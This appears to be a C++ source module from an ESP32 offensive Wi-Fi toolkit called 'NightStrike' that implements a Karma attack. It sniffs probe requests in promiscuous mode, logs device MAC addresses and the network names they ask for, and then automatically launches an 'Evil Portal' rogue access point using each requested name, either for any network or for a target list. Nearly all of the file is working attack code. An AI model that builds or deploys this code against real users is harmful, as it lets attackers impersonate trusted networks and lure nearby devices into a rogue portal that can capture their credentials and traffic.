#include "modules/wifi_module.h"
#include <esp_wifi.h>
#include <Arduino.h>
#include <set>
#include <vector>

namespace NightStrike {
namespace Modules {

// Karma Attack implementation
static bool g_karmaActive = false;
static std::vector<std::string> g_karmaSSIDs;
static std::set<std::string> g_seenProbes;
static WiFiModule* g_karmaWiFiModule = nullptr;

// Probe request structure
struct ProbeRequest {
    std::string mac;
    std::string ssid;
    int8_t rssi;
    uint8_t channel;
};

// Check if packet is a probe request with SSID
static bool isProbeRequestWithSSID(const uint8_t* frame, size_t len) {
    if (len < 24) return false;
    
    uint8_t frameType = (frame[0] & 0x0C) >> 2;
    uint8_t frameSubType = (frame[0] & 0xF0) >> 4;
    
    if (frameType == 0x00 && frameSubType == 0x04) { // Probe request
        size_t pos = 24;
        while (pos < len - 2) {
            uint8_t tag = frame[pos];
            uint8_t tagLen = frame[pos + 1];
            
            if (tag == 0x00 && tagLen > 0) return true; // SSID tag found
            pos += tagLen + 2;
        }
    }
    return false;
}

// Extract SSID from probe request
static std::string extractSSID(const uint8_t* frame, size_t len) {
    size_t pos = 24;
    while (pos < len - 2) {
        uint8_t tag = frame[pos];
        uint8_t tagLen = frame[pos + 1];
        
        if (tag == 0x00 && tagLen > 0) { // SSID tag
            std::string ssid;
            ssid.reserve(tagLen);
            for (uint8_t i = 0; i < tagLen; ++i) {
                char c = frame[pos + 2 + i];
                if (c >= 32 && c < 127) { // Printable ASCII
                    ssid += c;
                }
            }
            return ssid;
        }
        pos += tagLen + 2;
    }
    return "";
}

// Extract MAC from probe request
static std::string extractMAC(const uint8_t* frame) {
    char mac[18];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             frame[10], frame[11], frame[12], frame[13], frame[14], frame[15]);
    return std::string(mac);
}

// Karma sniffer callback
static void karmaSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!g_karmaActive || !g_karmaWiFiModule) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* frame = pkt->payload;
    size_t len = pkt->rx_ctrl.sig_len;
    
    if (isProbeRequestWithSSID(frame, len)) {
        std::string ssid = extractSSID(frame, len);
        std::string mac = extractMAC(frame);
        
        if (!ssid.empty()) {
            std::string probeKey = mac + ":" + ssid;
            
            // Check if we've seen this probe before
            if (g_seenProbes.find(probeKey) == g_seenProbes.end()) {
                g_seenProbes.insert(probeKey);
                
                Serial.printf("[Karma] Probe: %s from %s (RSSI: %d)\n",
                             ssid.c_str(), mac.c_str(), pkt->rx_ctrl.rssi);
                
                // Check if SSID is in our list or if we should create portal for any SSID
                bool shouldCreate = false;
                if (g_karmaSSIDs.empty()) {
                    // Create portal for any SSID
                    shouldCreate = true;
                } else {
                    // Check if SSID is in our target list
                    for (const auto& target : g_karmaSSIDs) {
                        if (ssid == target) {
                            shouldCreate = true;
                            break;
                        }
                    }
                }
                
                if (shouldCreate) {
                    // Start Evil Portal with this SSID
                    Serial.printf("[Karma] Creating Evil Portal: %s\n", ssid.c_str());
                    g_karmaWiFiModule->startEvilPortal(ssid);
                }
            }
        }
    }
}

Core::Error WiFiModule::startKarmaAttack(const std::vector<std::string>& ssids) {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }
    
    if (g_karmaActive) {
        return Core::Error(Core::ErrorCode::ALREADY_INITIALIZED);
    }
    
    g_karmaSSIDs = ssids;
    g_karmaWiFiModule = this;
    g_seenProbes.clear();
    
    // Start promiscuous mode to capture probe requests
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(karmaSnifferCallback);
    
    g_karmaActive = true;
    Serial.println("[Karma] Attack started");
    
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error WiFiModule::stopKarmaAttack() {
    if (!g_karmaActive) {
        return Core::Error(Core::ErrorCode::SUCCESS);
    }
    
    esp_wifi_set_promiscuous(false);
    g_karmaActive = false;
    g_karmaWiFiModule = nullptr;
    g_seenProbes.clear();
    
    // Stop any active Evil Portal
    stopEvilPortal();
    
    Serial.println("[Karma] Attack stopped");
    return Core::Error(Core::ErrorCode::SUCCESS);
}

} // namespace Modules
} // namespace NightStrike

